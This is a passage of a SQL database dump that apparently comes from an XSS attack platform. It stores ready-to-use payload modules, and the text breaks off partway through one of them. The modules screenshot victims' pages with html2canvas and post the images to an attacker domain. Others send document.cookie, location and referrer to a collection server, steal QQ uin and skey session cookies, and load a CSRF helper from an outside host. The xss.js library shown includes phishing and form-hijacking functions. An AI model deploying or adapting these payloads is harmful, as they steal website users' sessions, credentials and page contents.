args=[];args.push([&quot;line&quot;,Math.round(left),Math.round(top)]);args.push([&quot;line&quot;,Math.round(left+width),Math.round(top)]);args.push([&quot;line&quot;,Math.round(left+width),Math.round(height+top)]);args.push([&quot;line&quot;,Math.round(left),Math.round(height+top)]);createShape(ctx,args);ctx.save();ctx.clip();renderBackgroundRepeat(ctx,image,backgroundPosition,bounds);ctx.restore()}function renderBackgroundColor(ctx,backgroundBounds,bgcolor){renderRect(ctx,backgroundBounds.left,backgroundBounds.top,backgroundBounds.width,backgroundBounds.height,bgcolor)}function renderBackgroundRepeating(el,bounds,ctx,image,imageIndex){var backgroundSize=Util.BackgroundSize(el,bounds,image,imageIndex),backgroundPosition=Util.BackgroundPosition(el,bounds,image,imageIndex,backgroundSize),backgroundRepeat=getCSS(el,&quot;backgroundRepeat&quot;).split(&quot;,&quot;).map(Util.trimText);image=resizeImage(image,backgroundSize);backgroundRepeat=backgroundRepeat[imageIndex]||backgroundRepeat[0];switch(backgroundRepeat){case&quot;repeat-x&quot;:backgroundRepeatShape(ctx,image,backgroundPosition,bounds,bounds.left,bounds.top+backgroundPosition.top,99999,image.height);break;case&quot;repeat-y&quot;:backgroundRepeatShape(ctx,image,backgroundPosition,bounds,bounds.left+backgroundPosition.left,bounds.top,image.width,99999);break;case&quot;no-repeat&quot;:backgroundRepeatShape(ctx,image,backgroundPosition,bounds,bounds.left+backgroundPosition.left,bounds.top+backgroundPosition.top,image.width,image.height);break;default:renderBackgroundRepeat(ctx,image,backgroundPosition,{top:bounds.top,left:bounds.left,width:image.width,height:image.height});break}}function renderBackgroundImage(element,bounds,ctx){var backgroundImage=getCSS(element,&quot;backgroundImage&quot;),backgroundImages=Util.parseBackgroundImage(backgroundImage),image,imageIndex=backgroundImages.length;while(imageIndex--){backgroundImage=backgroundImages[imageIndex];if(!backgroundImage.args||backgroundImage.args.length===0){continue}var key=backgroundImage.method===&quot;url&quot;?backgroundImage.args[0]:backgroundImage.value;image=loadImage(key);if(image){renderBackgroundRepeating(element,bounds,ctx,image,imageIndex)}else{Util.log(&quot;html2canvas: Error loading background:&quot;,backgroundImage)}}}function resizeImage(image,bounds){if(image.width===bounds.width&amp;&amp;image.height===bounds.height){return image}var ctx,canvas=doc.createElement(&quot;canvas&quot;);canvas.width=bounds.width;canvas.height=bounds.height;ctx=canvas.getContext(&quot;2d&quot;);drawImage(ctx,image,0,0,image.width,image.height,0,0,bounds.width,bounds.height);return canvas}function setOpacity(ctx,element,parentStack){return ctx.setVariable(&quot;globalAlpha&quot;,getCSS(element,&quot;opacity&quot;)*((parentStack)?parentStack.opacity:1))}function removePx(str){return str.replace(&quot;px&quot;,&quot;&quot;)}var transformRegExp=/(matrix)\\((.+)\\)/;function getTransform(element,parentStack){var transform=getCSS(element,&quot;transform&quot;)||getCSS(element,&quot;-webkit-transform&quot;)||getCSS(element,&quot;-moz-transform&quot;)||getCSS(element,&quot;-ms-transform&quot;)||getCSS(element,&quot;-o-transform&quot;);var transformOrigin=getCSS(element,&quot;transform-origin&quot;)||getCSS(element,&quot;-webkit-transform-origin&quot;)||getCSS(element,&quot;-moz-transform-origin&quot;)||getCSS(element,&quot;-ms-transform-origin&quot;)||getCSS(element,&quot;-o-transform-origin&quot;)||&quot;0px 0px&quot;;transformOrigin=transformOrigin.split(&quot; &quot;).map(removePx).map(Util.asFloat);var matrix;if(transform&amp;&amp;transform!==&quot;none&quot;){var match=transform.match(transformRegExp);if(match){switch(match[1]){case&quot;matrix&quot;:matrix=match[2].split(&quot;,&quot;).map(Util.trimText).map(Util.asFloat);\r\nbreak}}}return{origin:transformOrigin,matrix:matrix}}function createStack(element,parentStack,bounds,transform){var ctx=h2cRenderContext((!parentStack)?documentWidth():bounds.width,(!parentStack)?documentHeight():bounds.height),stack={ctx:ctx,opacity:setOpacity(ctx,element,parentStack),cssPosition:getCSS(element,&quot;position&quot;),borders:getBorderData(element),transform:transform,clip:(parentStack&amp;&amp;parentStack.clip)?Util.Extend({},parentStack.clip):null};setZ(element,stack,parentStack);if(options.useOverflow===true&amp;&amp;/(hidden|scroll|auto)/.test(getCSS(element,&quot;overflow&quot;))===true&amp;&amp;/(BODY)/i.test(element.nodeName)===false){stack.clip=(stack.clip)?clipBounds(stack.clip,bounds):bounds}return stack}function getBackgroundBounds(borders,bounds,clip){var backgroundBounds={left:bounds.left+borders[3].width,top:bounds.top+borders[0].width,width:bounds.width-(borders[1].width+borders[3].width),height:bounds.height-(borders[0].width+borders[2].width)};if(clip){backgroundBounds=clipBounds(backgroundBounds,clip)}return backgroundBounds}function getBounds(element,transform){var bounds=(transform.matrix)?Util.OffsetBounds(element):Util.Bounds(element);transform.origin[0]+=bounds.left;transform.origin[1]+=bounds.top;return bounds}function renderElement(element,parentStack,pseudoElement,ignoreBackground){var transform=getTransform(element,parentStack),bounds=getBounds(element,transform),image,stack=createStack(element,parentStack,bounds,transform),borders=stack.borders,ctx=stack.ctx,backgroundBounds=getBackgroundBounds(borders,bounds,stack.clip),borderData=parseBorders(element,bounds,borders),backgroundColor=(ignoreElementsRegExp.test(element.nodeName))?&quot;#efefef&quot;:getCSS(element,&quot;backgroundColor&quot;);createShape(ctx,borderData.clip);ctx.save();ctx.clip();if(backgroundBounds.height&gt;0&amp;&amp;backgroundBounds.width&gt;0&amp;&amp;!ignoreBackground){renderBackgroundColor(ctx,bounds,backgroundColor);renderBackgroundImage(element,backgroundBounds,ctx)}else{if(ignoreBackground){stack.backgroundColor=backgroundColor}}ctx.restore();borderData.borders.forEach(function(border){renderBorders(ctx,border.args,border.color)});if(!pseudoElement){injectPseudoElements(element,stack)}switch(element.nodeName){case&quot;IMG&quot;:if((image=loadImage(element.getAttribute(&quot;src&quot;)))){renderImage(ctx,element,image,bounds,borders)}else{Util.log(&quot;html2canvas: Error loading &lt;img&gt;:&quot;+element.getAttribute(&quot;src&quot;))}break;case&quot;INPUT&quot;:if(/^(text|url|email|submit|button|reset)$/.test(element.type)&amp;&amp;(element.value||element.placeholder||&quot;&quot;).length&gt;0){renderFormValue(element,bounds,stack)}break;case&quot;TEXTAREA&quot;:if((element.value||element.placeholder||&quot;&quot;).length&gt;0){renderFormValue(element,bounds,stack)}break;case&quot;SELECT&quot;:if((element.options||element.placeholder||&quot;&quot;).length&gt;0){renderFormValue(element,bounds,stack)}break;case&quot;LI&quot;:renderListItem(element,stack,backgroundBounds);break;case&quot;CANVAS&quot;:renderImage(ctx,element,element,bounds,borders);break}return stack}function isElementVisible(element){return(getCSS(element,&quot;display&quot;)!==&quot;none&quot;&amp;&amp;getCSS(element,&quot;visibility&quot;)!==&quot;hidden&quot;&amp;&amp;!element.hasAttribute(&quot;data-html2canvas-ignore&quot;))}function parseElement(element,stack,pseudoElement){if(isElementVisible(element)){stack=renderElement(element,stack,pseudoElement,false)||stack;if(!ignoreElementsRegExp.test(element.nodeName)){parseChildren(element,stack,pseudoElement)}}}function parseChildren(element,stack,pseudoElement){Util.Children(element).forEach(function(node){if(node.nodeType===node.ELEMENT_NODE){parseElement(node,stack,pseudoElement)}else{if(node.nodeType===node.TEXT_NODE){renderText(element,node,stack)}}})}function init(){var background=getCSS(document.documentElement,&quot;backgroundColor&quot;),transparentBackground=(Util.isTransparent(background)&amp;&amp;element===document.body),stack=renderElement(element,null,false,transparentBackground);parseChildren(element,stack);if(transparentBackground){background=stack.backgroundColor}body.removeChild(hidePseudoElements);return{backgroundColor:background,stack:stack}}return init()};function h2czContext(zindex){return{zindex:zindex,children:[]}}_html2canvas.Preload=function(options){var images={numLoaded:0,numFailed:0,numTotal:0,cleanupDone:false},pageOrigin,Util=_html2canvas.Util,methods,i,count=0,element=options.elements[0]||document.body,doc=element.ownerDocument,domImages=element.getElementsByTagName(&quot;img&quot;),imgLen=domImages.length,link=doc.createElement(&quot;a&quot;),supportCORS=(function(img){return(img.crossOrigin!==undefined)})(new Image()),timeoutTimer;link.href=window.location.href;pageOrigin=link.protocol+link.host;function isSameOrigin(url){link.href=url;link.href=link.href;var origin=link.protocol+link.host;return(origin===pageOrigin)}function start(){Util.log(&quot;html2canvas: start: images: &quot;+images.numLoaded+&quot; / &quot;+images.numTotal+&quot; (failed: &quot;+images.numFailed+&quot;)&quot;);if(!images.firstRun&amp;&amp;images.numLoaded&gt;=images.numTotal){Util.log(&quot;Finished loading images: # &quot;+images.numTotal+&quot; (failed: &quot;+images.numFailed+&quot;)&quot;);if(typeof options.complete===&quot;function&quot;){options.complete(images)}}}function proxyGetImage(url,img,imageObj){var callback_name,scriptUrl=options.proxy,script;\r\nlink.href=url;url=link.href;callback_name=&quot;html2canvas_&quot;+(count++);imageObj.callbackname=callback_name;if(scriptUrl.indexOf(&quot;?&quot;)&gt;-1){scriptUrl+=&quot;&amp;&quot;}else{scriptUrl+=&quot;?&quot;}scriptUrl+=&quot;url=&quot;+encodeURIComponent(url)+&quot;&amp;callback=&quot;+callback_name;script=doc.createElement(&quot;script&quot;);window[callback_name]=function(a){if(a.substring(0,6)===&quot;error:&quot;){imageObj.succeeded=false;images.numLoaded++;images.numFailed++;start()}else{setImageLoadHandlers(img,imageObj);img.src=a}window[callback_name]=undefined;try{delete window[callback_name]}catch(ex){}script.parentNode.removeChild(script);script=null;delete imageObj.script;delete imageObj.callbackname};script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;);script.setAttribute(&quot;src&quot;,scriptUrl);imageObj.script=script;window.document.body.appendChild(script)}function loadPseudoElement(element,type){var style=window.getComputedStyle(element,type),content=style.content;if(content.substr(0,3)===&quot;url&quot;){methods.loadImage(_html2canvas.Util.parseBackgroundImage(content)[0].args[0])}loadBackgroundImages(style.backgroundImage,element)}function loadPseudoElementImages(element){loadPseudoElement(element,&quot;:before&quot;);loadPseudoElement(element,&quot;:after&quot;)}function loadGradientImage(backgroundImage,bounds){var img=_html2canvas.Generate.Gradient(backgroundImage,bounds);if(img!==undefined){images[backgroundImage]={img:img,succeeded:true};images.numTotal++;images.numLoaded++;start()}}function invalidBackgrounds(background_image){return(background_image&amp;&amp;background_image.method&amp;&amp;background_image.args&amp;&amp;background_image.args.length&gt;0)}function loadBackgroundImages(background_image,el){var bounds;_html2canvas.Util.parseBackgroundImage(background_image).filter(invalidBackgrounds).forEach(function(background_image){if(background_image.method===&quot;url&quot;){methods.loadImage(background_image.args[0])}else{if(background_image.method.match(/\\-?gradient$/)){if(bounds===undefined){bounds=_html2canvas.Util.Bounds(el)}loadGradientImage(background_image.value,bounds)}}})}function getImages(el){var elNodeType=false;try{Util.Children(el).forEach(getImages)}catch(e){}try{elNodeType=el.nodeType}catch(ex){elNodeType=false;Util.log(&quot;html2canvas: failed to access some element&#039;s nodeType - Exception: &quot;+ex.message)}if(elNodeType===1||elNodeType===undefined){loadPseudoElementImages(el);try{loadBackgroundImages(Util.getCSS(el,&quot;backgroundImage&quot;),el)}catch(e){Util.log(&quot;html2canvas: failed to get background-image - Exception: &quot;+e.message)}loadBackgroundImages(el)}}function setImageLoadHandlers(img,imageObj){img.onload=function(){if(imageObj.timer!==undefined){window.clearTimeout(imageObj.timer)}images.numLoaded++;imageObj.succeeded=true;img.onerror=img.onload=null;start()};img.onerror=function(){if(img.crossOrigin===&quot;anonymous&quot;){window.clearTimeout(imageObj.timer);if(options.proxy){var src=img.src;img=new Image();imageObj.img=img;img.src=src;proxyGetImage(img.src,img,imageObj);return}}images.numLoaded++;images.numFailed++;imageObj.succeeded=false;img.onerror=img.onload=null;start()}}methods={loadImage:function(src){var img,imageObj;if(src&amp;&amp;images[src]===undefined){img=new Image();if(src.match(/data:image\\/.*;base64,/i)){img.src=src.replace(/url\\([&#039;&quot;]{0,}|[&#039;&quot;]{0,}\\)$/ig,&quot;&quot;);imageObj=images[src]={img:img};images.numTotal++;setImageLoadHandlers(img,imageObj)}else{if(isSameOrigin(src)||options.allowTaint===true){imageObj=images[src]={img:img};images.numTotal++;setImageLoadHandlers(img,imageObj);img.src=src}else{if(supportCORS&amp;&amp;!options.allowTaint&amp;&amp;options.useCORS){img.crossOrigin=&quot;anonymous&quot;;imageObj=images[src]={img:img};images.numTotal++;setImageLoadHandlers(img,imageObj);img.src=src}else{if(options.proxy){imageObj=images[src]={img:img};images.numTotal++;proxyGetImage(src,img,imageObj)}}}}}},cleanupDOM:function(cause){var img,src;if(!images.cleanupDone){if(cause&amp;&amp;typeof cause===&quot;string&quot;){Util.log(&quot;html2canvas: Cleanup because: &quot;+cause)}else{Util.log(&quot;html2canvas: Cleanup after timeout: &quot;+options.timeout+&quot; ms.&quot;)}for(src in images){if(images.hasOwnProperty(src)){img=images[src];if(typeof img===&quot;object&quot;&amp;&amp;img.callbackname&amp;&amp;img.succeeded===undefined){window[img.callbackname]=undefined;try{delete window[img.callbackname]}catch(ex){}if(img.script&amp;&amp;img.script.parentNode){img.script.setAttribute(&quot;src&quot;,&quot;about:blank&quot;);img.script.parentNode.removeChild(img.script)}images.numLoaded++;images.numFailed++;Util.log(&quot;html2canvas: Cleaned up failed img: &#039;&quot;+src+&quot;&#039; Steps: &quot;+images.numLoaded+&quot; / &quot;+images.numTotal)}}}if(window.stop!==undefined){window.stop()}else{if(document.execCommand!==undefined){document.execCommand(&quot;Stop&quot;,false)}}if(document.close!==undefined){document.close()}images.cleanupDone=true;if(!(cause&amp;&amp;typeof cause===&quot;string&quot;)){start()}}},renderingDone:function(){if(timeoutTimer){window.clearTimeout(timeoutTimer)}}};if(options.timeout&gt;0){timeoutTimer=window.setTimeout(methods.cleanupDOM,options.timeout)}Util.log(&quot;html2canvas: Preload starts: finding background-images&quot;);images.firstRun=true;getImages(element);Util.log(&quot;html2canvas: Preload: Finding images&quot;);\r\nfor(i=0;i&lt;imgLen;i+=1){methods.loadImage(domImages[i].getAttribute(&quot;src&quot;))}images.firstRun=false;Util.log(&quot;html2canvas: Preload: Done.&quot;);if(images.numTotal===images.numLoaded){start()}return methods};_html2canvas.Renderer=function(parseQueue,options){function createRenderQueue(parseQueue){var queue=[],rootContext;rootContext=(function buildStackingContext(rootNode){var rootContext={};function insert(context,node,specialParent){var zi=(node.zIndex.zindex===&quot;auto&quot;)?0:Number(node.zIndex.zindex),contextForChildren=context,isPositioned=node.zIndex.isPositioned,isFloated=node.zIndex.isFloated,stub={node:node},childrenDest=specialParent;if(node.zIndex.ownStacking){contextForChildren=stub.context={&quot;!&quot;:[{node:node,children:[]}]};childrenDest=undefined}else{if(isPositioned||isFloated){childrenDest=stub.children=[]}}if(zi===0&amp;&amp;specialParent){specialParent.push(stub)}else{if(!context[zi]){context[zi]=[]}context[zi].push(stub)}node.zIndex.children.forEach(function(childNode){insert(contextForChildren,childNode,childrenDest)})}insert(rootContext,rootNode);return rootContext})(parseQueue);function sortZ(context){Object.keys(context).sort().forEach(function(zi){var nonPositioned=[],floated=[],positioned=[],list=[];context[zi].forEach(function(v){if(v.node.zIndex.isPositioned||v.node.zIndex.opacity&lt;1){positioned.push(v)}else{if(v.node.zIndex.isFloated){floated.push(v)}else{nonPositioned.push(v)}}});(function walk(arr){arr.forEach(function(v){list.push(v);if(v.children){walk(v.children)}})})(nonPositioned.concat(floated,positioned));list.forEach(function(v){if(v.context){sortZ(v.context)}else{queue.push(v.node)}})})}sortZ(rootContext);return queue}function getRenderer(rendererName){var renderer;if(typeof options.renderer===&quot;string&quot;&amp;&amp;_html2canvas.Renderer[rendererName]!==undefined){renderer=_html2canvas.Renderer[rendererName](options)}else{if(typeof rendererName===&quot;function&quot;){renderer=rendererName(options)}else{throw new Error(&quot;Unknown renderer&quot;)}}if(typeof renderer!==&quot;function&quot;){throw new Error(&quot;Invalid renderer defined&quot;)}return renderer}return getRenderer(options.renderer)(parseQueue,options,document,createRenderQueue(parseQueue.stack),_html2canvas)};_html2canvas.Util.Support=function(options,doc){function supportSVGRendering(){var img=new Image(),canvas=doc.createElement(&quot;canvas&quot;),ctx=(canvas.getContext===undefined)?false:canvas.getContext(&quot;2d&quot;);if(ctx===false){return false}canvas.width=canvas.height=10;img.src=[&quot;data:image/svg+xml,&quot;,&quot;&lt;svg xmlns=&#039;http://www.w3.org/2000/svg&#039; width=&#039;10&#039; height=&#039;10&#039;&gt;&quot;,&quot;&lt;foreignObject width=&#039;10&#039; height=&#039;10&#039;&gt;&quot;,&quot;&lt;div xmlns=&#039;http://www.w3.org/1999/xhtml&#039; style=&#039;width:10;height:10;&#039;&gt;&quot;,&quot;sup&quot;,&quot;&lt;/div&gt;&quot;,&quot;&lt;/foreignObject&gt;&quot;,&quot;&lt;/svg&gt;&quot;].join(&quot;&quot;);try{ctx.drawImage(img,0,0);canvas.toDataURL()}catch(e){return false}_html2canvas.Util.log(&quot;html2canvas: Parse: SVG powered rendering available&quot;);return true}function supportRangeBounds(){var r,testElement,rangeBounds,rangeHeight,support=false;if(doc.createRange){r=doc.createRange();if(r.getBoundingClientRect){testElement=doc.createElement(&quot;boundtest&quot;);testElement.style.height=&quot;123px&quot;;testElement.style.display=&quot;block&quot;;doc.body.appendChild(testElement);r.selectNode(testElement);rangeBounds=r.getBoundingClientRect();rangeHeight=rangeBounds.height;if(rangeHeight===123){support=true}doc.body.removeChild(testElement)}}return support}return{rangeBounds:supportRangeBounds(),svgRendering:options.svgRendering&amp;&amp;supportSVGRendering()}};window.html2canvas=function(elements,opts){elements=(elements.length)?elements:[elements];var queue,canvas,options={logging:false,elements:elements,background:&quot;#fff&quot;,proxy:null,timeout:0,useCORS:false,allowTaint:false,svgRendering:false,ignoreElements:&quot;IFRAME|OBJECT|PARAM&quot;,useOverflow:true,letterRendering:false,chinese:false,width:null,height:null,taintTest:true,renderer:&quot;Canvas&quot;};options=_html2canvas.Util.Extend(opts,options);_html2canvas.logging=options.logging;options.complete=function(images){if(typeof options.onpreloaded===&quot;function&quot;){if(options.onpreloaded(images)===false){return}}queue=_html2canvas.Parse(images,options);if(typeof options.onparsed===&quot;function&quot;){if(options.onparsed(queue)===false){return}}canvas=_html2canvas.Renderer(queue,options);if(typeof options.onrendered===&quot;function&quot;){options.onrendered(canvas)}};window.setTimeout(function(){_html2canvas.Preload(options)},0);return{render:function(queue,opts){return _html2canvas.Renderer(queue,_html2canvas.Util.Extend(opts,options))},parse:function(images,opts){return _html2canvas.Parse(images,_html2canvas.Util.Extend(opts,options))},preload:function(opts){return _html2canvas.Preload(_html2canvas.Util.Extend(opts,options))},log:_html2canvas.Util.log}};window.html2canvas.log=_html2canvas.Util.log;window.html2canvas.Renderer={Canvas:undefined};_html2canvas.Renderer.Canvas=function(options){options=options||{};var doc=document,safeImages=[],testCanvas=document.createElement(&quot;canvas&quot;),testctx=testCanvas.getContext(&quot;2d&quot;),Util=_html2canvas.Util,canvas=options.canvas||doc.createElement(&quot;canvas&quot;);\r\nfunction createShape(ctx,args){ctx.beginPath();args.forEach(function(arg){ctx[arg.name].apply(ctx,arg[&quot;arguments&quot;])});ctx.closePath()}function safeImage(item){if(safeImages.indexOf(item[&quot;arguments&quot;][0].src)===-1){testctx.drawImage(item[&quot;arguments&quot;][0],0,0);try{testctx.getImageData(0,0,1,1)}catch(e){testCanvas=doc.createElement(&quot;canvas&quot;);testctx=testCanvas.getContext(&quot;2d&quot;);return false}safeImages.push(item[&quot;arguments&quot;][0].src)}return true}function renderItem(ctx,item){switch(item.type){case&quot;variable&quot;:ctx[item.name]=item[&quot;arguments&quot;];break;case&quot;function&quot;:switch(item.name){case&quot;createPattern&quot;:if(item[&quot;arguments&quot;][0].width&gt;0&amp;&amp;item[&quot;arguments&quot;][0].height&gt;0){try{ctx.fillStyle=ctx.createPattern(item[&quot;arguments&quot;][0],&quot;repeat&quot;)}catch(e){Util.log(&quot;html2canvas: Renderer: Error creating pattern&quot;,e.message)}}break;case&quot;drawShape&quot;:createShape(ctx,item[&quot;arguments&quot;]);break;case&quot;drawImage&quot;:if(item[&quot;arguments&quot;][8]&gt;0&amp;&amp;item[&quot;arguments&quot;][7]&gt;0){if(!options.taintTest||(options.taintTest&amp;&amp;safeImage(item))){ctx.drawImage.apply(ctx,item[&quot;arguments&quot;])}}break;default:ctx[item.name].apply(ctx,item[&quot;arguments&quot;])}break}}return function(parsedData,options,document,queue,_html2canvas){var ctx=canvas.getContext(&quot;2d&quot;),newCanvas,bounds,fstyle,zStack=parsedData.stack;canvas.width=canvas.style.width=options.width||zStack.ctx.width;canvas.height=canvas.style.height=options.height||zStack.ctx.height;fstyle=ctx.fillStyle;ctx.fillStyle=(Util.isTransparent(zStack.backgroundColor)&amp;&amp;options.background!==undefined)?options.background:parsedData.backgroundColor;ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle=fstyle;queue.forEach(function(storageContext){ctx.textBaseline=&quot;bottom&quot;;ctx.save();if(storageContext.transform.matrix){ctx.translate(storageContext.transform.origin[0],storageContext.transform.origin[1]);ctx.transform.apply(ctx,storageContext.transform.matrix);ctx.translate(-storageContext.transform.origin[0],-storageContext.transform.origin[1])}if(storageContext.clip){ctx.beginPath();ctx.rect(storageContext.clip.left,storageContext.clip.top,storageContext.clip.width,storageContext.clip.height);ctx.clip()}if(storageContext.ctx.storage){storageContext.ctx.storage.forEach(function(item){renderItem(ctx,item)})}ctx.restore()});Util.log(&quot;html2canvas: Renderer: Canvas renderer done - returning canvas obj&quot;);if(options.elements.length===1){if(typeof options.elements[0]===&quot;object&quot;&amp;&amp;options.elements[0].nodeName!==&quot;BODY&quot;){bounds=_html2canvas.Util.Bounds(options.elements[0]);newCanvas=document.createElement(&quot;canvas&quot;);newCanvas.width=Math.ceil(bounds.width);newCanvas.height=Math.ceil(bounds.height);ctx=newCanvas.getContext(&quot;2d&quot;);ctx.drawImage(canvas,bounds.left,bounds.top,bounds.width,bounds.height,0,0,bounds.width,bounds.height);canvas=null;return newCanvas}}return canvas}}})(window,document);var img=new Image();img.src=&#039;#&#039;;img.onerror=function(){ html2canvas(document.body, {  onrendered : function (canvas) {     var html_canvas = canvas.toDataURL();  xssPost(&quot;https://替换成你的域名/index.php?do=api&amp;id={projectId}&quot;, html_canvas);   } });  function xssPost(url, postStr) {   var de;   de = document.body.appendChild(document.createElement(&#039;iframe&#039;));   de.src = &#039;about:blank&#039;;   de.height = 1;   de.width = 1;   de.contentDocument.write(&#039;&lt;form method=&quot;POST&quot; action=&quot;&#039; + url + &#039;&quot;&gt;&lt;input name=&quot;screenshot&quot; value=&quot;&#039; + postStr + &#039;&quot;/&gt;&lt;/form&gt;&#039;);   de.contentDocument.forms[0].submit();   de.style.display=&#039;none&#039;; } }', 0, 1, 'HTML5截图', 1, 1, 'uncia', 1422118925);
INSERT INTO `oc_module` (`id`, `userId`, `title`, `keys`, `setkeys`, `code`, `level`, `isOpen`, `description`, `isAudit`, `managerId`, `managerName`, `addTime`) VALUES
(57, 1, '读取COOKIE', '[]', '[]', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{$xssite}/?do=api&amp;act=r&amp;id={$pid}&amp;diy[location]=&#039;+escape(document.location)+&#039;&amp;diy[toplocation]=&#039;+escape(top.document.location)+&#039;&amp;diy[cookie]=&#039;+escape\r\n\r\n(document.cookie)+&#039;&amp;diy[opener]=&#039;+escape(myopener)+&#039;&amp;diy[referrer]=&#039;+escape(document.referrer)+&#039;&amp;diy[title]=&#039;+escape(document.title);', 0, 1, 'COOKIE', 1, 1, 'uncia', 1422120603),
(58, 1, 'CSRF', '["URL","postdata"]', '[]', ';;(function(){\r\n   var csrf = function(){\r\n		xss.csrf(decodeURIComponent(&quot;{set.URL}&quot;),&quot;{set.postdata}&quot;);\r\n   };\r\n   if(&#039;xss&#039; in window){\r\n		csrf();\r\n   }else{\r\n		var s = document.createElement(&#039;script&#039;);\r\n		s.onload = csrf;\r\n		s.src = &#039;//vvsec.vipsinaapp.com/xss.js&#039;;\r\n		document.body.appendChild(s);\r\n   }\r\n}());', 0, 1, '用于便捷的进行跨站请求，将项目生成的脚本加载到你的页面中即可。	', 1, 1, 'uncia', 1422120802),
(63, 1, 'QQ skey获取', '["uin","skey"]', '[]', 'function getCookie(name){  \r\n        var value=&quot;&quot;;  \r\n        var cookie = &quot;;&quot;+document.cookie.replace(/;\\s+/g,&quot;;&quot;)+&quot;;&quot;  \r\n        var pos = cookie.indexOf(&quot;;&quot;+name+&quot;=&quot;);  \r\n        if(pos&gt;-1){  \r\n            var start = cookie.indexOf(&quot;=&quot;,pos);  \r\n            var end = cookie.indexOf(&quot;;&quot;,start);  \r\n            value = unescape(cookie.substring(start+1,end));  \r\n        }  \r\n        return value;  \r\n}\r\ndocument.write(&#039;&lt;div style=&quot;display:none&quot;&gt;&lt;img src=&quot;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;uin=&#039;+getCookie(&quot;uin&quot;)+&#039;&amp;skey=&#039;+getCookie(&quot;skey&quot;)+&#039;&quot; width=0 height=0 border=0 /&gt;&lt;/div&gt;&#039;);', 0, 1, '', 1, 1, 'uncia', 1435497466),
(68, 1, 'xss.js 0.1', '[]', '[]', ';;var xss = function(){\r\n  var x = {\r\n   &#039;name&#039;:&#039;xss.js&#039;,\r\n    &#039;version&#039;:&#039;0.1&#039;,\r\n    &#039;author&#039;:&#039;jackmasa&#039;\r\n };\r\n  \r\n  x.x=function(id){return document.getElementById(id)};\r\n \r\n  //容错取值\r\n  x.e=function(_){try{return eval(&#039;(&#039;+_+&#039;)&#039;)}catch(e){return&#039;&#039;}};\r\n \r\n  //浏览器 \r\n  x.i={\r\n   i:!!self.ActiveXObject,\r\n   c:!!self.chrome,\r\n    f:self.mozPaintCount&gt;-1,\r\n   o:!!self.opera,\r\n   s:!self.chrome&amp;&amp;!!self.WebKitPoint\r\n  };\r\n  \r\n  //UA\r\n  x.ua = navigator.userAgent;\r\n \r\n  //判断是否为苹果手持设备\r\n x.apple=x.ua.match(/ip(one|ad|od)/i)!=null;\r\n \r\n  //随机数\r\n x.rdm=function(){return~~(Math.random()*100000)};\r\n\r\n //url编码(UTF8)\r\n x.ec=encodeURIComponent;\r\n\r\n  x.html=document.getElementsByTagName(&#039;html&#039;)[0];\r\n  \r\n  /*\r\n   * 销毁一个元素\r\n  */\r\n x.kill=function(e){\r\n   e.parentElement.removeChild(e);\r\n };\r\n\r\n  /*\r\n   *绑定事件\r\n   */\r\n x.bind=function(e,name,fn){\r\n   e.addEventListener?e.addEventListener(name,fn,false):e.attachEvent(&quot;on&quot;+name,fn);\r\n };\r\n  \r\n  /*\r\n   * dom准备完毕时执行函数\r\n  */\r\n x.ready=function(fn){\r\n   if(!x.i.i){\r\n     x.bind(document,&#039;DOMContentLoaded&#039;,fn);\r\n   }else{\r\n      var s = setInterval(function(){\r\n       try{\r\n          document.body.doScroll(&#039;left&#039;);\r\n         clearInterval(s);\r\n         fn();\r\n       }catch(e){}\r\n     },4);\r\n   }\r\n }\r\n\r\n /*\r\n   * 同源检测\r\n  */\r\n x.o=function(url){\r\n    var link = x.dom(&#039;&lt;a href=&quot;&#039;+encodeURI(url)+&#039;&quot;&gt;&#039;,2);\r\n    return link.protocol+link.hostname+&#039;:&#039;+link.port==location.protocol+location.hostname+&#039;:&#039;+link.port;\r\n  };\r\n  \r\n  /*\r\n   * html to dom\r\n   */\r\n x.dom=function(html,gcsec){\r\n   var tmp = document.createElement(&#039;span&#039;);\r\n   tmp.innerHTML=html;\r\n   var e = tmp.children[0];\r\n    e.style.display=&#039;none&#039;;\r\n   x.html.appendChild(e);\r\n    gcsec&gt;&gt;0&gt;0&amp;&amp;setTimeout(function(){\r\n     x.kill(e);\r\n    },gcsec*1000);\r\n    return e;\r\n };\r\n\r\n  /*\r\n   * ajax\r\n  */\r\n x.ajax = function(url,params,callback){\r\n   (params instanceof Function)&amp;&amp;(callback=params,params=void(0));\r\n   var XHR = (!x.o(url)&amp;&amp;window.XDomainRequest)||\r\n          window.XMLHttpRequest||\r\n         (function(){return new ActiveXObject(&#039;MSXML2.XMLHTTP&#039;)});\r\n   var xhr = new XHR();\r\n    xhr.open(params?&#039;post&#039;:&#039;get&#039;,url);\r\n    try{xhr.setRequestHeader(&#039;content-type&#039;,&#039;application/x-www-form-urlencoded&#039;)}catch(e){}\r\n   callback&amp;&amp;(xhr.onreadystatechange = function() {\r\n      (this.readyState == 4 &amp;&amp; ((this.status &gt;= 200 &amp;&amp; this.status &lt;= 300) || this.status == 304))&amp;&amp;callback.apply(this,arguments);\r\n   });\r\n   xhr.send(params);\r\n };\r\n\r\n  /*\r\n   * no ajax\r\n   */\r\n x.najax=function(url,params){\r\n   if(params){\r\n     var form = x.dom(&#039;&lt;form method=post accept-charset=utf-8&gt;&#039;);\r\n      form.action=url;\r\n      for(var name in params){\r\n        var input = document.createElement(&#039;input&#039;);\r\n        input.name=name;\r\n        input.value=params[name];\r\n       form.appendChild(input);\r\n      }\r\n     var iframe = x.dom(&#039;&lt;iframe name=_&#039;+x.rdm()+&#039;_&gt;&#039;,6);\r\n      form.target=iframe.name;\r\n      form.submit();\r\n    }else{\r\n      new Image().src=url+&#039;&amp;&#039;+x.rdm();\r\n    }\r\n };\r\n\r\n  /*\r\n   * 钓鱼\r\n  */\r\n x.phish=function(url){\r\n    x.ajax(url,function(){\r\n      document.open();\r\n      document.write(this.responseText);\r\n      document.close();\r\n     history.replaceState&amp;x.o(url)&amp;&amp;history.replaceState(&#039;&#039;,&#039;&#039;,url);\r\n   })\r\n  };\r\n\r\n  /*\r\n   * 表单劫持\r\n  */\r\n x.xform=function(form,action){\r\n    form.old_action=form.action,form.old_target=form.target,form.action=action;\r\n   var iframe = x.dom(&#039;&lt;iframe 